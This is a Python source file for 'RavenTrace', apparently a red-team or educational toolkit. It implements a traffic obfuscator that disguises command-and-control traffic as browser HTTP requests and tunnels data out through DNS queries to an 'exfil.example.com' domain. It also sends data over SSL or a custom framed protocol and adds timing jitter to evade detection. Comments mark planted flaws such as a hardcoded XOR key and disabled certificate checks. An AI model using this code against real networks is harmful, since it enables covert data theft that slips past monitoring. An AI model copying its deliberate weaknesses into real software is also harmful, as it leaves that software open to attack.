#!/usr/bin/env python3
"""
RavenTrace - Traffic Obfuscator Module

This module provides traffic obfuscation capabilities for the RavenTrace toolkit,
allowing command and control traffic to mimic legitimate protocols like HTTP, DNS,
or encrypted SSL. It includes intentional flaws for educational purposes.

Author: RavenTrace Team
Version: 0.1.0
License: Educational Use Only
"""

import base64
import json
import random
import socket
import ssl
import sys
import time
import urllib.parse
from dataclasses import dataclass
from enum import Enum, auto
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union

# Modern Python 3.10+ features
from functools import cache
from importlib.metadata import version


class ObfuscationType(Enum):
    """Enum for supported traffic obfuscation types."""
    HTTP = auto()
    DNS = auto()
    SSL_ONLY = auto()
    CUSTOM = auto()


@dataclass
class ObfuscationConfig:
    """Configuration dataclass for obfuscation settings."""
    type: ObfuscationType
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    domain_fronting: bool = False
    jitter: float = 0.5  # Time jitter in seconds
    custom_headers: Optional[Dict[str, str]] = None
    encryption_key: str = "default_insecure_key"  # INTENTIONAL FLAW: Hardcoded encryption key
    ssl_verify: bool = False  # INTENTIONAL FLAW: SSL verification disabled by default


class TrafficObfuscator:
    """
    Main class for traffic obfuscation in RavenTrace.
    
    This class provides methods to obfuscate command and control traffic
    using various techniques like HTTP mimicry, DNS tunneling, and custom
    protocols with optional encryption.
    """
    
    def __init__(self, config: ObfuscationConfig):
        """Initialize the obfuscator with the given configuration."""
        self.config = config
        self.session_id = self._generate_session_id()
        
        # INTENTIONAL FLAW: Predictable session ID generation
        self.sequence_number = 0
        
        # Cache for DNS responses (modern feature - using @cache decorator)
        self._dns_cache = {}
        
        # Initialize SSL context if needed
        if self.config.type in (ObfuscationType.SSL_ONLY, ObfuscationType.HTTP):
            self.ssl_context = self._create_ssl_context()
    
    @staticmethod
    def _generate_session_id() -> str:
        """
        Generate a session ID for tracking the current session.
        
        INTENTIONAL FLAW: Uses predictable session ID generation based on timestamp.
        """
        return f"session_{int(time.time())}"
    
    def _create_ssl_context(self) -> ssl.SSLContext:
        """
        Create an SSL context for secure communications.
        
        INTENTIONAL FLAW: Uses weak cipher suites and disables certificate validation.
        """
        context = ssl.create_default_context()
        
        # INTENTIONAL FLAW: Disable certificate validation
        if not self.config.ssl_verify:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        
        # INTENTIONAL FLAW: Set weak cipher suites
        context.set_ciphers('DEFAULT@SECLEVEL=1')
        
        return context
    
    def _add_jitter(self) -> None:
        """Add random timing jitter to avoid detection based on timing patterns."""
        if self.config.jitter > 0:
            jitter_time = random.uniform(0, self.config.jitter)
            time.sleep(jitter_time)
    
    def _encrypt_data(self, data: Union[str, bytes]) -> bytes:
        """
        Encrypt data using a simple XOR cipher.
        
        INTENTIONAL FLAW: Uses weak XOR encryption instead of proper cryptography.
        
        Args:
            data: The data to encrypt (string or bytes)
            
        Returns:
            bytes: The encrypted data
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        key = self.config.encryption_key.encode('utf-8')
        key_len = len(key)
        
        # INTENTIONAL FLAW: Simple XOR encryption is cryptographically weak
        encrypted = bytearray(len(data))
        for i, byte in enumerate(data):
            encrypted[i] = byte ^ key[i % key_len]
            
        return bytes(encrypted)
    
    def _decrypt_data(self, data: bytes) -> bytes:
        """
        Decrypt data using the same XOR cipher.
        
        Args:
            data: The encrypted data
            
        Returns:
            bytes: The decrypted data
        """
        # XOR is symmetric, so encryption and decryption are the same operation
        return self._encrypt_data(data)
    
    @cache  # Modern Python feature - caching decorator
    def _generate_http_headers(self) -> Dict[str, str]:
        """Generate realistic HTTP headers for HTTP mimicry."""
        headers = {
            "User-Agent": self.config.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "X-Session-ID": self.session_id,  # INTENTIONAL FLAW: Leaking session ID in headers
        }
        
        # Add custom headers if provided
        if self.config.custom_headers:
            headers.update(self.config.custom_headers)
            
        return headers
    
    def _format_http_request(self, data: Union[str, bytes]) -> bytes:
        """
        Format data as an HTTP GET or POST request.
        
        Args:
            data: The data to send
            
        Returns:
            bytes: Formatted HTTP request
        """
        # Encrypt and encode the data
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        encrypted_data = self._encrypt_data(data)
        encoded_data = base64.urlsafe_b64encode(encrypted_data).decode('ascii')
        
        # Determine if GET or POST based on data size
        if len(encoded_data) < 1024:
            # Use GET for small data
            headers = self._generate_http_headers()
            request_lines = [
                f"GET /api/data?q={encoded_data}&seq={self.sequence_number} HTTP/1.1",
                f"Host: {'example.com' if not self.config.domain_fronting else 'legitimate-looking-domain.com'}",
            ]
            
            for key, value in headers.items():
                request_lines.append(f"{key}: {value}")
                
            request_lines.append("\r\n")  # Empty line to indicate end of headers
            return "\r\n".join(request_lines).encode('ascii')
        else:
            # Use POST for larger data
            headers = self._generate_http_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Content-Length"] = str(len(encoded_data) + 4)  # +4 for "data="
            
            request_lines = [
                f"POST /api/submit HTTP/1.1",
                f"Host: {'example.com' if not self.config.domain_fronting else 'legitimate-looking-domain.com'}",
            ]
            
            for key, value in headers.items():
                request_lines.append(f"{key}: {value}")
                
            request_lines.append("\r\n")  # Empty line to indicate end of headers
            request_lines.append(f"data={encoded_data}")
            
            return "\r\n".join(request_lines).encode('ascii')
    
    def _parse_http_response(self, response: bytes) -> bytes:
        """
        Parse an HTTP response and extract the data.
        
        Args:
            response: The HTTP response
            
        Returns:
            bytes: The extracted and decrypted data
        """
        try:
            # Split headers and body
            headers_end = response.find(b"\r\n\r\n")
            if headers_end == -1:
                return b""
                
            body = response[headers_end + 4:]
            
            # Extract data from JSON response if possible
            try:
                json_data = json.loads(body.decode('utf-8'))
                if "data" in json_data:
                    encoded_data = json_data["data"]
                    encrypted_data = base64.urlsafe_b64decode(encoded_data)
                    return self._decrypt_data(encrypted_data)
            except (json.JSONDecodeError, UnicodeDecodeError):
                pass
                
            # Try to find base64 data in the response
            import re
            b64_pattern = re.compile(rb'[A-Za-z0-9+/=]{16,}')
            matches = b64_pattern.findall(body)
            
            if matches:
                for match in matches:
                    try:
                        # Try to decode and decrypt each potential base64 string
                        encrypted_data = base64.b64decode(match)
                        decrypted = self._decrypt_data(encrypted_data)
                        
                        # Check if result looks like valid data (e.g., JSON or text)
                        if b'{' in decrypted and b'}' in decrypted:
                            return decrypted
                    except Exception:
                        continue
            
            # If all else fails, return the body as is
            return body
        except Exception as e:
            # INTENTIONAL FLAW: Silently handling exceptions
            return b""
    
    def _encode_dns_data(self, data: Union[str, bytes]) -> List[str]:
        """
        Encode data for DNS tunneling.
        
        Args:
            data: The data to encode
            
        Returns:
            List[str]: List of DNS query strings
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        encrypted_data = self._encrypt_data(data)
        encoded_data = base64.b32encode(encrypted_data).decode('ascii')
        
        # Split into chunks for DNS queries (max 63 chars per label)
        chunks = []
        chunk_size = 63
        
        for i in range(0, len(encoded_data), chunk_size):
            chunk = encoded_data[i:i+chunk_size]
            chunks.append(chunk)
            
        # Format as DNS queries
        queries = []
        for i, chunk in enumerate(chunks):
            # INTENTIONAL FLAW: Predictable query format
            query = f"{chunk.lower()}.{i}.{self.session_id}.exfil.example.com"
            queries.append(query)
            
        return queries
    
    def _decode_dns_response(self, responses: List[bytes]) -> bytes:
        """
        Decode DNS responses back to original data.
        
        Args:
            responses: List of DNS responses
            
        Returns:
            bytes: The decoded and decrypted data
        """
        # Extract encoded data from TXT records
        encoded_chunks = []
        
        for response in responses:
            try:
                # Very simplified DNS response parsing
                # INTENTIONAL FLAW: Naive parsing of DNS responses
                if b'TXT' in response:
                    txt_start = response.find(b'"') + 1
                    txt_end = response.find(b'"', txt_start)
                    if txt_start > 0 and txt_end > txt_start:
                        encoded_chunks.append(response[txt_start:txt_end])
            except Exception:
                continue
                
        if not encoded_chunks:
            return b""
            
        # Combine chunks and decode
        try:
            encoded_data = b''.join(encoded_chunks)
            encrypted_data = base64.b32decode(encoded_data)
            return self._decrypt_data(encrypted_data)
        except Exception as e:
            # INTENTIONAL FLAW: Silently handling exceptions
            return b""
    
    def send_data(self, data: Union[str, bytes], target: str, port: int) -> Optional[bytes]:
        """
        Send data using the configured obfuscation method.
        
        Args:
            data: The data to send
            target: The target host
            port: The target port
            
        Returns:
            Optional[bytes]: The response data if any
        """
        self._add_jitter()
        self.sequence_number += 1
        
        if self.config.type == ObfuscationType.HTTP:
            return self._send_http(data, target, port)
        elif self.config.type == ObfuscationType.DNS:
            return self._send_dns(data, target, port)
        elif self.config.type == ObfuscationType.SSL_ONLY:
            return self._send_ssl(data, target, port)
        elif self.config.type == ObfuscationType.CUSTOM:
            return self._send_custom(data, target, port)
        else:
            raise ValueError(f"Unsupported obfuscation type: {self.config.type}")
    
    def _send_http(self, data: Union[str, bytes], target: str, port: int) -> Optional[bytes]:
        """Send data using HTTP mimicry."""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Wrap with SSL if needed
            if port == 443:
                sock = self.ssl_context.wrap_socket(sock, server_hostname=target)
                
            # Connect and send
            sock.connect((target, port))
            request = self._format_http_request(data)
            sock.sendall(request)
            
            # Receive response
            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                
                # Check if we've received the full response
                if b"\r\n0\r\n\r\n" in response or not (b"Transfer-Encoding: chunked" in response):
                    if b"\r\n\r\n" in response:
                        break
            
            sock.close()
            return self._parse_http_response(response)
            
        except Exception as e:
            # INTENTIONAL FLAW: Exception details are logged but connection errors are not handled properly
            print(f"HTTP connection error: {e}", file=sys.stderr)
            return None
    
    def _send_dns(self, data: Union[str, bytes], target: str, port: int) -> Optional[bytes]:
        """Send data using DNS tunneling."""
        try:
            queries = self._encode_dns_data(data)
            responses = []
            
            for query in queries:
                # Create a simple UDP socket for DNS
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                
                # Simplified DNS query construction
                # INTENTIONAL FLAW: Very basic DNS query construction
                transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
                flags = (0x0100).to_bytes(2, 'big')  # Standard query
                qdcount = (0x0001).to_bytes(2, 'big')  # One question
                ancount = (0x0000).to_bytes(2, 'big')  # No answers
                nscount = (0x0000).to_bytes(2, 'big')  # No authority records
                arcount = (0x0000).to_bytes(2, 'big')  # No additional records
                
                header = transaction_id + flags + qdcount + ancount + nscount + arcount
                
                # Encode domain name in DNS format
                parts = query.split('.')
                question = b''
                for part in parts:
                    question += len(part).to_bytes(1, 'big') + part.encode('ascii')
                question += b'\x00'  # Terminating null byte
                
                # Add QTYPE (TXT = 16) and QCLASS (IN = 1)
                question += (0x0010).to_bytes(2, 'big') + (0x0001).to_bytes(2, 'big')
                
                dns_query = header + question
                
                # Send query and receive response
                sock.sendto(dns_query, (target, port))
                response, _ = sock.recvfrom(4096)
                responses.append(response)
                sock.close()
                
                # Add jitter between queries
                time.sleep(random.uniform(0.1, 0.3))
                
            return self._decode_dns_response(responses)
            
        except Exception as e:
            # INTENTIONAL FLAW: Exception details are logged but connection errors are not handled properly
            print(f"DNS connection error: {e}", file=sys.stderr)
            return None
    
    def _send_ssl(self, data: Union[str, bytes], target: str, port: int) -> Optional[bytes]:
        """Send data using pure SSL/TLS."""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Wrap with SSL
            wrapped_sock = self.ssl_context.wrap_socket(sock, server_hostname=target)
            
            # Connect and send
            wrapped_sock.connect((target, port))
            
            # Encrypt and send data
            if isinstance(data, str):
                data = data.encode('utf-8')
                
            encrypted_data = self._encrypt_data(data)
            
            # INTENTIONAL FLAW: No proper framing or length prefixing
            wrapped_sock.sendall(encrypted_data)
            
            # Receive response
            response = b""
            try:
                while True:
                    chunk = wrapped_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                # INTENTIONAL FLAW: Silently handling timeout
                pass
                
            wrapped_sock.close()
            
            # Decrypt response
            if response:
                return self._decrypt_data(response)
            return None
            
        except Exception as e:
            # INTENTIONAL FLAW: Exception details are logged but connection errors are not handled properly
            print(f"SSL connection error: {e}", file=sys.stderr)
            return None
    
    def _send_custom(self, data: Union[str, bytes], target: str, port: int) -> Optional[bytes]:
        """
        Send data using a custom obfuscation protocol.
        
        INTENTIONAL FLAW: The custom protocol has weak obfuscation and no proper authentication.
        """
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Connect
            sock.connect((target, port))
            
            # Prepare data
            if isinstance(data, str):
                data = data.encode('utf-8')
                
            # INTENTIONAL FLAW: Weak custom protocol
            # Format: [MAGIC_BYTES][LENGTH][SESSION_ID][SEQ_NUM][ENCRYPTED_DATA]
            magic = b'RAVEN'
            session_id_bytes = self.session_id.encode('ascii')
            seq_num_bytes = self.sequence_number.to_bytes(4, 'big')
            encrypted_data = self._encrypt_data(data)
            
            length = len(session_id_bytes) + len(seq_num_bytes) + len(encrypted_data)
            length_bytes = length.to_bytes(4, 'big')
            
            message = magic + length_bytes + session_id_bytes + seq_num_bytes + encrypted_data
            
            # Send data
            sock.sendall(message)
            
            # Receive response
            response_magic = sock.recv(5)
            if response_magic != magic:
                sock.close()
                return None
                
            response_length_bytes = sock.recv(4)
            response_length = int.from_bytes(response_length_bytes, 'big')
            
            response_data = b""
            bytes_received = 0
            while bytes_received < response_length:
                chunk = sock.recv(min(4096, response_length - bytes_received))
                if not chunk:
                    break
                response_data += chunk
                bytes_received += len(chunk)
                
            sock.close()
            
            # Skip session ID and sequence number in response
            encrypted_response = response_data[len(session_id_bytes) + 4:]
            return self._decrypt_data(encrypted_response)
            
        except Exception as e:
            # INTENTIONAL FLAW: Exception details are logged but connection errors are not handled properly
            print(f"Custom protocol connection error: {e}", file=sys.stderr)
            return None


# Example usage and helper functions
def create_default_config(obfuscation_type: str = "http") -> ObfuscationConfig:
    """
    Create a default configuration for the specified obfuscation type.
    
    Args:
        obfuscation_type: The type of obfuscation to use (http, dns, ssl, custom)
        
    Returns:
        ObfuscationConfig: A configuration object
    """
    type_map = {
        "http": ObfuscationType.HTTP,
        "dns": ObfuscationType.DNS,
        "ssl": ObfuscationType.SSL_ONLY,
        "custom": ObfuscationType.CUSTOM
    }
    
    if obfuscation_type.lower() not in type_map:
        raise ValueError(f"Unsupported obfuscation type: {obfuscation_type}")
        
    return ObfuscationConfig(
        type=type_map[obfuscation_type.lower()],
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        domain_fronting=False,
        jitter=0.5,
        custom_headers={"X-Requested-With": "XMLHttpRequest"},
        encryption_key="default_insecure_key",  # INTENTIONAL FLAW: Hardcoded key
        ssl_verify=False  # INTENTIONAL FLAW: SSL verification disabled
    )


def main():
    """Example usage of the TrafficObfuscator class."""
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <obfuscation_type> <target> <port> [data]")
        print("Obfuscation types: http, dns, ssl, custom")
        sys.exit(1)
        
    obfuscation_type = sys.argv[1]
    target = sys.argv[2]
    port = int(sys.argv[3])
    
    data = " ".join(sys.argv[4:]) if len(sys.argv) > 4 else "Hello, RavenTrace!"
    
    try:
        config = create_default_config(obfuscation_type)
        obfuscator = TrafficObfuscator(config)
        
        print(f"Sending data using {obfuscation_type} obfuscation...")
        response = obfuscator.send_data(data, target, port)
        
        if response:
            print(f"Response received: {response.decode('utf-8', errors='replace')}")
        else:
            print("No response received or error occurred.")
            
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
